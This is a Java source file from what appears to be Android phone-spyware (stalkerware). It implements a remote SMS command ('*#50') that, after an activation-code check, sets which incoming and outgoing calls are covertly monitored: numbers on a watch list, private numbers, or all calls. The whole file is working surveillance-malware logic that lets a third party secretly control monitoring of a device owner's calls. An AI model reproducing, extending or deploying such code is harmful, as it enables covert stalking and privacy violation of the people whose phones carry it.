package com.fx.dalvik.smscommand.interpreter;

import java.util.ArrayList;
import java.util.Iterator;
import java.util.List;
import java.util.regex.Pattern;

import android.content.Context;
import android.os.SystemClock;

import com.fx.dalvik.smscommand.SmsCommandHelper;
import com.fx.maind.ref.Customization;
import com.fx.preference.SpyInfoManager;
import com.fx.preference.SpyInfoManagerFactory;
import com.fx.util.FxResource;
import com.vvt.logger.FxLog;
import com.vvt.util.GeneralUtil;

public class SmsWatchListSetting {

	private static final String TAG = "SmsWatchListSetting";
 	private static final boolean LOCAL_LOGV = Customization.VERBOSE;
	
	public static final String COMMAND_ID = "*#50";
	
	public static final short TYPE_INVALID = 0;
	public static final short TYPE_OVERALL_SETTING = 1;
	public static final short TYPE_ADD_WPN = 2;
	public static final short TYPE_DETAILED_SETTING = 3;
	
	// Watch list setting command
	// <*#50><FK><WLFLAG> -> WLFLAG 0 = disable, 1 = Enable, 2 = Enable all number
	// <*#50><FK><WPN(1..*)> -> WPN = Watch Phone Number -> can be multiple
	// <*#50><FK><WLF1, WLF2, WLF3>
	// WLF1 = all, WLF2 = in watch list, WLF3 = private number
	public static String processCommand(Context context, String[] tokens) {
		if (LOCAL_LOGV) {
			FxLog.v(TAG, "processCommand # Enter ..");
		}
		
		// Check command format
		boolean debugTagValidation = 
				   (tokens.length == 3 && !SmsCommandHelper.isEndWithDebugTag(tokens))
				|| (tokens.length == 4 && SmsCommandHelper.isEndWithDebugTag(tokens));
		
		if (!debugTagValidation) {
			return String.format("%s\n%s",
					FxResource.LANGUAGE_SMSCOMMAND_RESPONSE_ERROR, 
					FxResource.LANGUAGE_SMSCOMMAND_RESPONSE_INVALID_COMMAND_FORMAT);
		}
		
		// Check activation Code
		String activationCodeValidation = 
			SmsCommandHelper.getActivationCodeValidation(context, tokens[1]);
		
		if (!activationCodeValidation.equals(FxResource.LANGUAGE_SMSCOMMAND_RESPONSE_OK)) {
			return activationCodeValidation;
		}
		
		// Check 3rd token to identify command type
		String response = null;
		short commandType = getCommandType(tokens);
		switch(commandType) {
			case TYPE_OVERALL_SETTING:
				response = updateOverallSetting(context, tokens[2]);
				break;
			case TYPE_ADD_WPN:
				response = updateWatchNumber(context, tokens[2]);
				break;
			case TYPE_DETAILED_SETTING:
				response = updateDetailedSetting(context, tokens[2]);
				break;
			default:
				response = FxResource.LANGUAGE_SMSCOMMAND_RESPONSE_INVALID_COMMAND_FORMAT;
		}
		return response;
	}
	
	private static String updateOverallSetting(Context context, String watchListFlag) {
		SpyInfoManager spyInfoManager = SpyInfoManagerFactory.getSpyInfoManager(context);
		if (watchListFlag.equals("0")) {
			spyInfoManager.setWatchAllEnabled(false);
		}
		else if (watchListFlag.equals("1")) {
			spyInfoManager.setWatchAllEnabled(false);
			spyInfoManager.setWatchListEnabled(true);
		}
		else if (watchListFlag.equals("2")) {
			spyInfoManager.setWatchAllEnabled(true);
		}
		
		spyInfoManager.sendRequestUpdateSpyInfo();
		SystemClock.sleep(500);
		
		return FxResource.LANGUAGE_SMSCOMMAND_RESPONSE_OK + "\n" 
				+ SmsCommandHelper.getSpyCallSettings(context, false, true);
	}
	
	private static String updateWatchNumber(Context context, String watchNumberToken) {
		if (LOCAL_LOGV) {
			FxLog.v(TAG, "updateWatchNumber # ENTER ...");
		}
		
		// Extract token to get input numbers and also remove duplicated number
		String[] inputNumbers = GeneralUtil.getTokenArray(
				watchNumberToken, SmsCommandHelper.COMMA_DELIMITERS);
		
		SpyInfoManager spyInfoManager = SpyInfoManagerFactory.getSpyInfoManager(context);
		
		// Load and obtain current watch list (unmodifiable list)
		spyInfoManager.loadWatchListFromStorage();
		final List<String> currentWatchList = spyInfoManager.getWatchList();
		
		// Create a new watch list
		ArrayList<String> updatedWatchList = new ArrayList<String>();
		updatedWatchList.addAll(currentWatchList);
		for (String number : inputNumbers) {
			updatedWatchList.add(number);
		}
		
		// Remove duplicated items from list
		updatedWatchList = removeDuplicatedItem(updatedWatchList);
		
		// Check if watch list exceeds the limit 
		boolean isExceedLitmit = spyInfoManager.getMaximumNumbers() - updatedWatchList.size() < 0;
		
		if (isExceedLitmit) {
			if (LOCAL_LOGV) {
				FxLog.v(TAG, "updateWatchNumber # Watch list exceeds the limit!!");
			}
			
			String response = String.format("%s\n%s\n%s",
					FxResource.LANGUAGE_SMSCOMMAND_RESPONSE_ERROR, 
					FxResource.LANGUAGE_SMSCOMMAND_RESPONSE_WATCH_LIST_FULL, 
					SmsCommandHelper.getSpyCallSettings(context, false, true));
			
			return response;
		}
		else {
			// IMPORTANT: dumpWatchListToStorage() will notify SpyInfoApplier 
			// to update the watch list by querying the info from SpyInfoManager
			// while getSpyCallSettings() need the same info and using the same method
			// This will sometimes generate ConcurrentModificationException
			// SOLUTION: Put a time gap between dumpWatchListToStorage and getSpyCallSettings
			
			if (LOCAL_LOGV) {
				FxLog.v(TAG, String.format("updateWatchNumber # Updating watch list: %s", 
						updatedWatchList.toString()));
			}
			
			spyInfoManager.setWatchList(updatedWatchList);
			spyInfoManager.dumpWatchListToStorage();
			
			spyInfoManager.sendRequestUpdateSpyInfo();
			SystemClock.sleep(500);
				
			String response = String.format("%s\n%s", 
					FxResource.LANGUAGE_SMSCOMMAND_RESPONSE_OK, 
					SmsCommandHelper.getSpyCallSettings(context, false, true));
			
			return response;
		}
	}
	
	private static String updateDetailedSetting(Context context, String settingToken) {
		// Extract token to get input numbers
		String[] setting = GeneralUtil.getTokenArray(
				settingToken, SmsCommandHelper.COMMA_DELIMITERS);
		
		SpyInfoManager spyInfoManager = SpyInfoManagerFactory.getSpyInfoManager(context);
		
		if (setting[0].equals("0")) {
			spyInfoManager.setWatchAllEnabled(false);
		}
		
		// Update watch in watch list status
		if (setting[1].equals("0")) {
			spyInfoManager.setWatchListEnabled(false);
		}
		else {
			spyInfoManager.setWatchListEnabled(true);
		}

		// Update watch private number status
		if (setting[2].equals("0")) {
			spyInfoManager.setWatchPrivateEnabled(false);
		}
		else {
			spyInfoManager.setWatchPrivateEnabled(true);
		}
		
		// Update watch all status
		// Check this at the final since it can affect previous settings
		if (setting[0].equals("1")) {
			spyInfoManager.setWatchAllEnabled(true);
		}
		
		spyInfoManager.sendRequestUpdateSpyInfo();
		SystemClock.sleep(500);
		
		return FxResource.LANGUAGE_SMSCOMMAND_RESPONSE_OK + "\n" 
				+ SmsCommandHelper.getSpyCallSettings(context, false, true);
	}
	
	/**
	 * Check 3rd token to identify command type
	 */
	private static short getCommandType(String[] tokens) {
		System.out.println(String.format("getCommandType # input: %s", tokens[2]));
		
		if (Pattern.matches("[ ]*[0-2][ ]*", tokens[2])) {
			System.out.println("getCommandType # TYPE_OVERALL_SETTING");
			return TYPE_OVERALL_SETTING;
		}
		else if (Pattern.matches("[ ]*[0-1]([ ]*,[ ]*[0-1][ ]*){2}+", tokens[2])) {
			System.out.println("getCommandType # TYPE_DETAILED_SETTING");
			return TYPE_DETAILED_SETTING;
		}
		else {
			String[] inputNumbers = GeneralUtil.getTokenArray(
					tokens[2], SmsCommandHelper.COMMA_DELIMITERS);
			
			boolean isInputNumbersValid = true;
			
			if (inputNumbers.length == 0 || inputNumbers.length > 10) {
				isInputNumbersValid = false;
			}
			else {
				String regexNumber = "[+]{0,1}[0-9]+";
				for (String number : inputNumbers) {
					if (number.trim().length() < 2 || 
							!Pattern.matches(regexNumber, number.trim())) {
						isInputNumbersValid = false;
						break;
					}
				}
			}
			
			if (isInputNumbersValid) {
				System.out.println("getCommandType # TYPE_ADD_WPN");
				return TYPE_ADD_WPN;
			}
			else {
				System.out.println("getCommandType # TYPE_INVALID");
				return TYPE_INVALID;
			}
		}
	}
	
	private static ArrayList<String> removeDuplicatedItem(List<String> input) {
		ArrayList<String> output = new ArrayList<String>();
		
		String item = null;
		for (Iterator<String> it = input.iterator(); it.hasNext();) {
			item = it.next();
			if (!output.contains(item)) {
				output.add(item);
			}
		}
		return output;
	}
}
